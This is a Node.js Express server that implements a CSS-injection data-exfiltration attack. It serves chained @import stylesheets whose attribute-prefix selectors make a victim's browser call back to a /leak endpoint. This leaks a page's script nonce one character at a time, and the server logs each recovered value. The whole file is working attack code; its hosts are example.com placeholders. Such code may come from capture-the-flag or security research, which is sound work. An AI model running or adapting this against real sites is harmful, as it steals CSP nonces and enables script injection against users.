const compression = require("compression");
const express = require("express");
const cssesc = require("cssesc");
const spdy = require("spdy");
const fs = require("fs");

const app = express();
app.set("etag", false);
app.use(compression());

const SESSIONS = {};

const POLLING_ORIGIN = `https://example.com:3000`;
const LEAK_ORIGIN = `https://example.com:3000`;

function urlencode(s) {
	return encodeURIComponent(s).replace(/'/g, "%27");
}

function createSession(length = 150) {
	let resolves = [];
	let promises = [];
	for (let i = 0; i < length; ++i) {
		promises[i] = new Promise((resolve) => (resolves[i] = resolve));
	}
	resolves[0]("");
	return { promises, resolves };
}

const CHARSET = Array.from(
	"1234567890/=+QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
);
app.get("/polling/:session/:index", async (req, res) => {
	let { session, index } = req.params;
	index = parseInt(index);
	if (index === 0 || !(session in SESSIONS)) {
		SESSIONS[session] = createSession();
	}

	res.set("Content-Type", "text/css");
	res.set("Cache-Control", "no-cache");

	let knownValue = await SESSIONS[session].promises[index];

	const ret = CHARSET.map((char) => {
		return `script[nonce^="${cssesc(
			knownValue + char
		)}"] ~ a { background: url("${LEAK_ORIGIN}/leak/${session}/${urlencode(
			knownValue + char
		)}")}`;
	}).join("\n");

	res.send(ret);
});

app.get("/leak/:session/:value", (req, res) => {
	let { session, value } = req.params;
	console.log(`[${session}] Leaked value: ${value}`);

	SESSIONS[session].resolves[value.length](value);
	res.status(204).send();
});

app.get("/generate", (req, res) => {
	const length = req.query.len || 100;
	const session = Math.random().toString(36).slice(2);

	res.set("Content-type", "text/plain");
	for (let i = 0; i < length; ++i) {
		res.write(
			`<style>@import '${POLLING_ORIGIN}/polling/${session}/${i}';</style>\n`
		);
	}
	res.send();
});

// const options = {
// 	key: fs.readFileSync("/etc/ssl/private/private.key"),
// 	cert: fs.readFileSync("/etc/ssl/certs/full_chain.pem"),
// };

const PORT = 3000;
spdy.createServer(app).listen(PORT, () =>
	console.log(`Example app listening on port ${PORT}!`)
);
